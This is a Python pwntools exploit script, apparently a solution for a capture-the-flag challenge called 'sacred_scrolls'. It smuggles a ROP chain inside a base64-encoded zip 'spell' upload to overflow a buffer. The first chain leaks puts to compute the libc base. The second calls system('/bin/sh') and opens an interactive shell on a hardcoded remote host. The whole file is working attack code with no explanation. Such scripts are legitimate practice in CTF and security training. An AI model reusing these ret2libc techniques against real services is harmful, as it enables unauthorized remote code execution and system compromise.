#!/usr/bin/env python3

from pwn import *

exe = ELF("sacred_scrolls_patched", checksec=False)
libc = ELF("./glibc/libc.so.6", checksec=False)
ld = ELF("./glibc/ld-linux-x86-64.so.2", checksec=False)

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '70', '-I']
context.log_level 	= "WARNING"
# context.log_level 	= "DEBUG"
isDebug = False
shouldPrint = True

# break *0x400F8F
# break *0x400A5B
# break main
# break save_spell
# break spell_read
# break spell_upload
# break *0x400da1
gs = '''
set follow-fork-mode parent
break spell_save
disable
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def print_result(result):
	if shouldPrint:
		print(result)
  
def enter_wizard_tag(value:bytes):
    io.sendlineafter(b"wizard tag: ", value)
    # result = io.recvlines()
    # input("Press Enter to continue...")
    # return result

def leak_libc():
    spell_save()
    io.recvuntil(b"not be saved!\n")
    leak = io.recvline().strip()
    leak = u64(leak.ljust(8, b"\x00"))
    libc.address = leak - 0x80ed0
    log.info(f"Leaked libc address: {hex(leak)}")

def spell_upload():
	import base64
	import zipfile
	from io import BytesIO
	rop = ROP(exe)
	ret_gadget = rop.find_gadget(['ret'])[0]
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	content = b"\xf0\x9f\x91\x93\xe2\x9a\xa1\x00"
	content += b"\x77" * 32
	content += p64(ret_gadget)
	content += p64(pop_rdi)
	content += p64(exe.got['puts'])
	content += p64(exe.plt['puts'])
	content += p64(ret_gadget)
	content += p64(exe.sym['main'])

	zip_buffer = BytesIO()
	with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zip_file:
		zip_file.writestr('spell.txt', content)

	zip_bytes = zip_buffer.getvalue()
	base64payload = base64.b64encode(zip_bytes)

	io.sendline(b"1")
	io.sendlineafter(b"named spell.zip): ", base64payload)
 
def exploit():
	import base64
	import zipfile
	from io import BytesIO
	rop = ROP(exe)
	ret_gadget = rop.find_gadget(['ret'])[0]
	pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	content = b"\xf0\x9f\x91\x93\xe2\x9a\xa1\x00"
	content += b"\x77" * 32
	content += p64(ret_gadget)
	content += p64(pop_rdi)
	content += p64(next(libc.search(b"/bin/sh\x00")))
	content += p64(libc.symbols['system'])

	zip_buffer = BytesIO()
	with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_STORED) as zip_file:
		zip_file.writestr('spell.txt', content)

	zip_bytes = zip_buffer.getvalue()
	base64payload = base64.b64encode(zip_bytes)

	io.sendline(b"1")
	io.sendlineafter(b"named spell.zip): ", base64payload)
    
def spell_read():
    io.sendlineafter(b">> ", b"2")
    
def spell_save():
    io.sendlineafter(b">> ", b"3")
    

#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
# ip_offset = find_ip_offset(cyclic(200))
# ip_offset = 56
# io = start_local(isDebug)

######## REMOTE ########
remote_address = "94.237.56.181:51525"
io = remote(remote_address.split(":")[0], int(remote_address.split(":")[1]))
io.timeout = 2

enter_wizard_tag(b"")
io.recvuntil(b">> ")
spell_upload()
spell_read()
leak_libc()

enter_wizard_tag(b"")
io.recvuntil(b">> ")
exploit()
spell_read()
spell_save()
io.interactive()
